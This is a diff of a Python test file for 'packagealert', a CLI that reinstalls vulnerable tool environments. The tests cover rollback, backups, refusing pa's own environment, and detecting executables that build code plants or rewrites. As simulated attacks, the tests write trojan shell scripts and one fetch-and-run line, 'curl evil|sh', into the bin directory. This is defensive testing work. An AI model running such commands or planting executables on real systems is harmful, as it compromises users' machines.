@@ -123,7 +123,8 @@ async def test_a_failed_build_that_deleted_the_tool_is_rolled_back(tool):
 
     outcome, _ = await _apply(tool, Runner(failed_build, code=1))
     assert outcome["applied"] is False
-    assert outcome["reason"] == "the reinstall failed (exit 1); the tool was restored as it was"
+    assert outcome["reason"] == ("the reinstall failed (exit 1); the tool was restored as it was; "
+                                 f"its backup is in {outcome['backup']}")
     assert _tree(tool.venv) == before
     assert os.readlink(tool.link) == str(tool.venv / "bin" / "http")
 
@@ -179,7 +180,8 @@ async def test_an_interrupted_reinstall_is_rolled_back_and_the_interruption_retu
 
     outcome, stopped = await _apply(tool, Runner(interrupted))
     assert isinstance(stopped, KeyboardInterrupt)
-    assert outcome["reason"] == "the reinstall was interrupted; the tool was restored as it was"
+    assert outcome["reason"] == ("the reinstall was interrupted; the tool was restored as it was; "
+                                 f"its backup is in {outcome['backup']}")
     assert _tree(tool.venv) == before
 
 
@@ -275,9 +277,9 @@ def _invoke(args):
 
 
 @pytest.mark.parametrize(("args", "message"), [
-    (["--uv"], "--uv and --app need --tools"),
-    (["--app", "x"], "--uv and --app need --tools"),
-    (["--tools"], "--tools needs a manager: --uv"),
+    (["--uv"], "--uv, --pipx and --app need --tools"),
+    (["--pipx"], "--uv, --pipx and --app need --tools"),
+    (["--app", "x"], "--uv, --pipx and --app need --tools"),
     (["--tools", "--uv", "some/project"], "--tools fixes tool environments, not a project: drop the path"),
     (["--tools", "--uv", "--apply", "--lock-only"], "--lock-only and --sync do not apply to --tools"),
 ])
@@ -313,15 +315,15 @@ async def test_each_tool_is_planned_and_problems_are_reported(tool, monkeypatch,
     monkeypatch.setattr(fix_cmd, "_run_fix", fake_run_fix)
     kw = {"allow_major": frozenset(), "allow_cooldown": False, "verify": True, "allow_project_env": False,
           "apply": None}
-    code = await fix_tools.run_fix_tools(None, app_name=None, fmt="json", **kw)
+    code = await fix_tools.run_fix_tools(None, managers=("uv",), app_name=None, fmt="json", **kw)
     out = json.loads(capsys.readouterr().out)
     assert code == 1
     assert planned == ["uv:httpie"]
     assert out["tools"] == [{"tool": "uv:httpie"}]
     assert out["errors"][0]["tool"] == "uv:broken"
     assert "uv-receipt.toml" in out["errors"][0]["error"]
-    assert await fix_tools.run_fix_tools(None, app_name="nope", fmt="text", **kw) == 2
-    assert await fix_tools.run_fix_tools(None, app_name="httpie", fmt="text", **kw) == 0
+    assert await fix_tools.run_fix_tools(None, managers=("uv",), app_name="nope", fmt="text", **kw) == 2
+    assert await fix_tools.run_fix_tools(None, managers=("uv",), app_name="httpie", fmt="text", **kw) == 0
 
 
 def test_the_reinstall_can_reach_its_local_sources(tmp_path):
@@ -378,10 +380,10 @@ async def test_app_ignores_other_tools_that_cannot_be_read(tool, monkeypatch, ca
         kw = {"allow_major": frozenset(), "allow_cooldown": False, "verify": True, "allow_project_env": False,
               "apply": None}
         assert pt.tool_envs(tool.root)[1] == [str(other)]
-        assert await fix_tools.run_fix_tools(None, app_name="httpie", fmt="text", **kw) == 0
-        assert await fix_tools.run_fix_tools(None, app_name="nope", fmt="text", **kw) == 2
-        assert await fix_tools.run_fix_tools(None, app_name="other", fmt="text", **kw) == 1
-        assert await fix_tools.run_fix_tools(None, app_name=None, fmt="text", **kw) == 1
+        assert await fix_tools.run_fix_tools(None, managers=("uv",), app_name="httpie", fmt="text", **kw) == 0
+        assert await fix_tools.run_fix_tools(None, managers=("uv",), app_name="nope", fmt="text", **kw) == 2
+        assert await fix_tools.run_fix_tools(None, managers=("uv",), app_name="other", fmt="text", **kw) == 1
+        assert await fix_tools.run_fix_tools(None, managers=("uv",), app_name=None, fmt="text", **kw) == 1
     finally:
         other.chmod(0o700)
 
@@ -655,9 +657,10 @@ async def test_rollback_leaves_links_outside_the_executables_directory(tool, tmp
     assert os.readlink(alias) == str(tool.venv / "bin" / "http")
 
 
-async def test_rollback_leaves_new_entries_that_are_not_links_into_the_tool(tool):
-    """Only a link the reinstall added into the tool is removed; anything else appearing in the
-    executables' directory meanwhile (another program's install) is left."""
+async def test_rollback_moves_other_new_entries_out_of_path_and_names_them(tool):
+    """Anything else that appeared in the executables' directory during the run (planted by build
+    code, or another program's install meanwhile) is taken off PATH but kept in the backup, and
+    the reason says where."""
     other_file, other_link = tool.link.parent / "other", tool.link.parent / "other-link"
 
     def meanwhile_then_fails():
@@ -667,8 +670,11 @@ async def test_rollback_leaves_new_entries_that_are_not_links_into_the_tool(tool
 
     outcome, _ = await _apply(tool, Runner(meanwhile_then_fails, code=1))
     assert outcome["applied"] is False
-    assert other_file.read_text() == "#!/bin/sh\n"
-    assert os.readlink(other_link) == "/usr/bin/true"
+    assert not os.path.lexists(other_file) and not os.path.lexists(other_link)
+    added = Path(outcome["backup"]) / "added-during-run"
+    assert (added / "other").read_text() == "#!/bin/sh\n"
+    assert os.readlink(added / "other-link") == "/usr/bin/true"
+    assert f"now moved out of it: {other_file} (moved to {added / 'other'})" in outcome["reason"]
 
 
 async def test_restoring_a_link_leaves_unrelated_entries_alone(tool):
@@ -819,7 +825,7 @@ async def test_an_interrupted_json_run_still_reports_what_was_done(tool, monkeyp
 
     monkeypatch.setattr(fix_cmd, "_run_fix", applied_then_interrupted)
     with pytest.raises(KeyboardInterrupt):
-        await fix_tools.run_fix_tools(None, app_name=None, fmt="json", allow_major=frozenset(),
+        await fix_tools.run_fix_tools(None, managers=("uv",), app_name=None, fmt="json", allow_major=frozenset(),
                                       allow_cooldown=False, verify=True, allow_project_env=False, apply=None)
     out = json.loads(capsys.readouterr().out)
     assert out["interrupted"] is True
@@ -1003,7 +1009,8 @@ async def test_a_file_left_at_the_tools_path_is_replaced(tool):
         tool.venv.write_text("half-built")
 
     outcome, _ = await _apply(tool, Runner(left_a_file, code=1))
-    assert outcome["reason"] == "the reinstall failed (exit 1); the tool was restored as it was"
+    assert outcome["reason"] == ("the reinstall failed (exit 1); the tool was restored as it was; "
+                                 f"its backup is in {outcome['backup']}")
     assert _tree(tool.venv) == before
 
 
@@ -1099,7 +1106,8 @@ async def test_an_executable_named_like_the_manifest_is_saved_not_followed(tool,
 
     outcome, _ = await _apply(tool, Runner(failed_build, code=1))
     assert victim.read_text() == "untouched\n"
-    assert outcome["reason"] == "the reinstall failed (exit 1); the tool was restored as it was"
+    assert outcome["reason"] == ("the reinstall failed (exit 1); the tool was restored as it was; "
+                                 f"its backup is in {outcome['backup']}")
 
 
 def test_an_executable_named_like_a_manifest_field_keeps_the_directory_recorded(tmp_path):
@@ -1281,3 +1289,249 @@ async def test_a_large_executables_permissions_alone_are_restored(tool, monkeypa
     outcome, _ = await _apply(tool, Runner(drops_the_execute_bit, code=1))
     assert outcome["applied"] is False
     assert big.stat().st_mode & 0o777 == 0o755
+
+
+# ── pa's own environment, and what a failed run leaves ───────────────────────
+
+async def test_apply_refuses_pas_own_environment(tool, monkeypatch, tmp_path):
+    import sys
+
+    via = tmp_path / "via"
+    os.symlink(tool.venv, via)
+    monkeypatch.setattr(sys, "prefix", str(via))
+    runner = Runner(lambda: None)
+    outcome, _ = await _apply(tool, runner)
+    assert outcome["reason"] == "pa's own environment: run the printed command yourself"
+    assert outcome["command"] == ["uv", "tool", "install", "--force", "httpie==3.2.2", "--with",
+                                  "urllib3==1.26.19", "--python", "3.12"]
+    assert runner.calls == []
+    assert not tool.backups.exists()
+
+
+@pytest.mark.parametrize("rollback", ["succeeds", "fails"])
+async def test_failed_run_keeps_backup_copies(tool, rollback):
+    def failed_build():
+        shutil.rmtree(tool.venv)
+        tool.link.unlink()
+        if rollback == "fails":
+            (backup,) = tool.backups.iterdir()
+            (backup / "venv" / "pyvenv.cfg").write_text("home = /evil\n")
+
+    outcome, _ = await _apply(tool, Runner(failed_build, code=1))
+    assert outcome["applied"] is False
+    backup = Path(outcome["backup"])
+    assert outcome["reason"].endswith(f"its backup is in {backup}")
+    assert (backup / "venv").is_dir()
+    assert (backup / "executables").is_dir()
+    assert (backup / "executables" / "http").is_symlink()
+
+
+async def test_own_environment_still_prints_the_command(tool, monkeypatch, capsys, tmp_path):
+    """The refused tool's command is still printed, in the text output and in the JSON."""
+    import sys
+    from unittest.mock import AsyncMock, patch
+
+    from packagealert.cli import fix_cmd
+    from packagealert.cli.run_settings import ProjectRunSettings
+    from packagealert.config import load_config
+    from tests.unit.cli.test_fix_cmd import _patches
+
+    monkeypatch.setattr(sys, "prefix", str(tool.venv))
+    monkeypatch.setattr(fix_cmd, "_BACKUP_ROOT", tool.backups)
+    runner = Runner(lambda: None)
+    plan = _plan()
+    settings = ProjectRunSettings(None, {}, [], False, False, False, False)
+    command = "uv tool install --force httpie==3.2.2 --with urllib3==1.26.19 --python 3.12"
+    for fmt in ("json", "text"):
+        target = fix_cmd.PlanTarget(tool.adapter, tool.venv / "uv-receipt.toml", tool.adapter.label,
+                                    apply=fix_tools._tool_applier(tool.adapter, tool.root))
+        a, b, c, d = _patches()
+        with a, b, c, d, \
+                patch("packagealert.remediate.planner.plan_fixes", return_value=plan), \
+                patch.object(fix_cmd, "_captured_runner", return_value=(runner, None)), \
+                patch.object(fix_cmd, "_verify", AsyncMock(return_value=(plan, None))), \
+                patch("packagealert.cli.run_settings.resolve_project_run_settings", return_value=settings), \
+                patch("packagealert.yanks.check_yanks", AsyncMock(return_value=([], 0))):
+            await fix_cmd._run_fix(load_config(None), tool.venv, allow_major=frozenset(), allow_cooldown=False,
+                                   fmt=fmt, apply=ApplyOptions("reinstall", yes=True, interactive=False),
+                                   target=target)
+        out = capsys.readouterr().out
+        if fmt == "json":
+            data = json.loads(out)
+            assert data["commands"] == [command.split()]
+            assert data["apply"]["reason"] == "pa's own environment: run the printed command yourself"
+        else:
+            assert command in out
+            assert "Not applied: pa's own environment: run the printed command yourself" in out
+    assert runner.calls == []
+
+
+@pytest.mark.parametrize(("code", "status"), [(0, "fixed"), (1, "apply_failed")])
+async def test_a_real_apply_outcome_reaches_the_json_status(tool, monkeypatch, capsys, code, status):
+    """apply_tool's own outcome, an accepted reinstall or a rolled-back one, through _plan_and_report."""
+    from unittest.mock import AsyncMock, patch
+
+    from packagealert.cli import fix_cmd
+    from packagealert.cli.run_settings import ProjectRunSettings
+    from packagealert.config import load_config
+    from tests.unit.cli.test_fix_cmd import _patches
+
+    monkeypatch.setattr(fix_cmd, "_BACKUP_ROOT", tool.backups)
+
+    def reinstall():
+        if code == 0:
+            _write_venv(tool.venv, {"httpie": "3.2.2", "urllib3": "1.26.19"})
+        else:
+            shutil.rmtree(tool.venv)
+            tool.link.unlink()
+
+    plan = _plan()
+    results: list[dict] = []
+    target = fix_cmd.PlanTarget(tool.adapter, tool.venv / "uv-receipt.toml", tool.adapter.label, emit=results.append,
+                                apply=fix_tools._tool_applier(tool.adapter, tool.root), manager="uv", app="httpie")
+    a, b, c, d = _patches()
+    with a, b, c, d, \
+            patch("packagealert.remediate.planner.plan_fixes", return_value=plan), \
+            patch.object(fix_cmd, "_captured_runner", return_value=(Runner(reinstall, code=code), None)), \
+            patch.object(fix_cmd, "_verify", AsyncMock(return_value=(plan, None))), \
+            patch("packagealert.cli.run_settings.resolve_project_run_settings",
+                  return_value=ProjectRunSettings(None, {}, [], False, False, False, False)), \
+            patch("packagealert.yanks.check_yanks", AsyncMock(return_value=([], 0))):
+        await fix_cmd._run_fix(load_config(None), tool.venv, allow_major=frozenset(), allow_cooldown=False,
+                               fmt="json", apply=ApplyOptions("reinstall", yes=True, interactive=False),
+                               target=target)
+    capsys.readouterr()
+    (data,) = results
+    (entry,) = data["planned"]
+    assert entry["status"] == status
+    assert (entry["backup"] is not None) == (status == "apply_failed")
+    assert data["apply"]["applied"] is (code == 0)
+
+
+def test_a_backup_that_fails_partway_leaves_nothing_behind(tool, monkeypatch):
+    """A half-copied backup would look like a real one to someone restoring by hand."""
+    real_copytree = shutil.copytree
+
+    def fails_partway(src, dst, **kw):
+        real_copytree(src / "bin", dst / "bin", **kw)
+        raise OSError(28, "No space left on device")
+
+    monkeypatch.setattr(fix_tools.shutil, "copytree", fails_partway)
+    with pytest.raises(OSError, match="No space left"):
+        fix_tools._backup(tool.venv, b"receipt", "uv-receipt.toml", tool.backups, "uv-tool-httpie")
+    assert list(tool.backups.iterdir()) == []
+
+
+def test_two_backups_in_one_second_are_both_kept(tool, monkeypatch):
+    monkeypatch.setattr(fix_tools.time, "strftime", lambda fmt: "20261103-120000")
+    first = fix_tools._backup(tool.venv, b"receipt", "uv-receipt.toml", tool.backups, "uv-tool-httpie")
+    second = fix_tools._backup(tool.venv, b"receipt", "uv-receipt.toml", tool.backups, "uv-tool-httpie")
+    assert first != second and (first / "venv").is_dir() and (second / "venv").is_dir()
+
+
+def test_a_backup_without_room_is_refused_before_copying(tool, monkeypatch):
+    monkeypatch.setattr(fix_tools.shutil, "disk_usage", lambda _p: SimpleNamespace(free=1024))
+    with pytest.raises(OSError, match="not enough free space"):
+        fix_tools._backup(tool.venv, b"receipt", "uv-receipt.toml", tool.backups, "uv-tool-httpie")
+    assert list(tool.backups.iterdir()) == []
+
+
+@pytest.mark.parametrize("code", [0, 1])
+async def test_a_bin_entry_the_tool_does_not_own_changed_during_the_run_is_put_back(tool, code):
+    """Build code with the executables' directory writable rewrites another tool's link, a user's
+    own script, and adds a new command: none is accepted, and each is put back or moved out."""
+    bin_dir = tool.link.parent
+    os.symlink("/opt/ruff/bin/ruff", bin_dir / "ruff")
+    (bin_dir / "backup-photos").write_text("#!/bin/sh\necho user script\n")
+
+    def reinstall_and_plant():
+        _write_venv(tool.venv, {"httpie": "3.2.2", "urllib3": "1.26.19"})
+        (bin_dir / "ruff").unlink()
+        (bin_dir / "ruff").write_text("#!/bin/sh\necho TROJAN\n")
+        (bin_dir / "backup-photos").write_text("#!/bin/sh\necho TROJAN\n")
+        (bin_dir / "git").write_text("#!/bin/sh\necho TROJAN\n")
+
+    outcome, _ = await _apply(tool, Runner(reinstall_and_plant, code=code))
+    assert outcome["applied"] is False
+    if code == 0:
+        assert outcome["reason"].startswith(f"the run changed backup-photos, git, ruff in {bin_dir}")
+    assert os.readlink(bin_dir / "ruff") == "/opt/ruff/bin/ruff"
+    assert (bin_dir / "backup-photos").read_text() == "#!/bin/sh\necho user script\n"
+    assert not os.path.lexists(bin_dir / "git")
+    assert os.readlink(tool.link) == str(tool.venv / "bin" / "http")
+
+
+async def test_the_tools_own_executable_may_change_as_a_link_into_it(tool):
+    bin_dir = tool.link.parent
+
+    def reinstall_relinking():
+        _write_venv(tool.venv, {"httpie": "3.2.2", "urllib3": "1.26.19"})
+        (tool.venv / "bin" / "http-new").write_text("#!/bin/sh\n")
+        tool.link.unlink()
+        os.symlink(tool.venv / "bin" / "http-new", tool.link)
+
+    outcome, _ = await _apply(tool, Runner(reinstall_relinking))
+    assert outcome["applied"] is True, outcome["reason"]
+    assert os.readlink(bin_dir / "http") == str(tool.venv / "bin" / "http-new")
+
+
+async def test_the_backup_space_check_counts_the_saved_executables(tool, monkeypatch):
+    big = tool.link.parent / "huge"
+    fd = os.open(big, os.O_WRONLY | os.O_CREAT, 0o755)
+    try:
+        os.truncate(fd, 300 * 2**20)  # sparse: nothing on disk, 300 MB once copied
+    finally:
+        os.close(fd)
+    seen: list[int] = []
+    real = shutil.disk_usage
+
+    def usage(p):
+        seen.append(1)
+        return SimpleNamespace(free=200 * 2**20, total=real(p).total, used=0)
+
+    monkeypatch.setattr(fix_tools.shutil, "disk_usage", usage)
+    outcome, _ = await _apply(tool, Runner(lambda: None))
+    assert seen and outcome["reason"].startswith("could not back up the tool (not enough free space")
+
+
+async def test_a_fifo_in_the_venv_is_named_with_what_to_do(tool):
+    os.mkfifo(tool.venv / "lib" / "fifo")
+    outcome, _ = await _apply(tool, Runner(lambda: None))
+    assert outcome["reason"] == (f"could not back up the tool ({tool.venv / 'lib' / 'fifo'} is not a file, directory or "
+                                 "link (a FIFO, socket or device, which nothing pip installs, so build code may have "
+                                 "left it); remove it, then run the command again)")
+
+
+@pytest.mark.parametrize("code", [0, 1])
+async def test_a_large_executable_rewritten_in_place_is_found_and_put_back(tool, code):
+    """Over 1 MB an entry's state is its metadata alone: rewritten in place with its size kept and
+    its mtime put back, it is still found (by its contents) and put back from the saved copy."""
+    big = tool.link.parent / "uv"
+    original = b"\x7fELF" + b"\0" * (2 * 2**20)
+    big.write_bytes(original)
+    os.chmod(big, 0o755)
+
+    def reinstall_and_rewrite():
+        _write_venv(tool.venv, {"httpie": "3.2.2", "urllib3": "1.26.19"})
+        st = os.stat(big)
+        with open(big, "r+b") as f:
+            f.write(b"#!/bin/sh\ncurl evil|sh\n")
+        os.utime(big, ns=(st.st_atime_ns, st.st_mtime_ns))
+
+    outcome, _ = await _apply(tool, Runner(reinstall_and_rewrite, code=code))
+    assert outcome["applied"] is False
+    if code == 0:
+        assert outcome["reason"].startswith(f"the run changed uv in {tool.link.parent}")
+    assert big.read_bytes() == original
+
+
+async def test_a_name_only_the_new_record_claims_is_not_the_tools(tool):
+    """The record after the run was written inside the sandbox: a new name it claims (a planted
+    ~/.local/bin/git linked into the tool) is not accepted as the tool's."""
+    bin_dir = tool.link.parent
+    before = fix_tools._inventory(bin_dir)
+    (tool.venv / "bin" / "git").write_text("#!/bin/sh\n")
+    os.symlink(tool.venv / "bin" / "git", bin_dir / "git")
+    odd = fix_tools._unexpected_executables(bin_dir, before, {tool.link}, {tool.link, bin_dir / "git"},
+                                            tool.venv, tool.backups / "none")
+    assert odd == ["git"]
